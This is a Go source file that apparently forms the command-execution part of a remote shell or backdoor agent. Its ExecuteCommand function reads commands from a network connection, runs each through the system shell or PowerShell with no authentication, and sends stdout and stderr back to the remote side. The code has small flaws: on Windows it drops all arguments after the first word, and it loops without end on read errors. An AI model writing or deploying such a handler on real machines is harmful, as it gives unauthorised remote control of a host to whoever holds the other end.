package execution

import (
	"bufio"
	"bytes"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

type Command struct {
	Output string
	Error  string
}

func ExecuteCommand(connection net.Conn) {
	reader := bufio.NewReader(connection)
	loop := true

	for loop {
		rawInput, err := reader.ReadString('\n')
		if err != nil {
			continue
		}

		args := strings.Split(strings.TrimSuffix(rawInput, "\n"), " ")
		if args[0] == "stop" {
			loop = false
			continue
		} else if args[0] == "cd" && len(args) > 1 {
			cmdStruct := &Command{}

			if err := os.Chdir(args[1]); err != nil {
				cmdStruct.Error = err.Error()
			}

			encoder := gob.NewEncoder(connection)
			err = encoder.Encode(cmdStruct)
			if err != nil {
				fmt.Println(err)
				continue
			}
		} else {
			var cmdOutput bytes.Buffer
			var cmdError bytes.Buffer
			var cmdInstance *exec.Cmd

			if runtime.GOOS == "windows" {
				cmdInstance = exec.Command("powershell.exe", "/C", args[0])
			} else {
				cmdInstance = exec.Command(args[0], args[1:]...)
			}

			cmdInstance.Stdout = &cmdOutput
			cmdInstance.Stderr = &cmdError

			cmdInstance.Run()

			cmdStruct := &Command{}
			cmdStruct.Output = cmdOutput.String()
			cmdStruct.Error = cmdError.String()

			encoder := gob.NewEncoder(connection)
			err = encoder.Encode(cmdStruct)
			if err != nil {
				fmt.Println(err)
				continue
			}
		}
	}
}
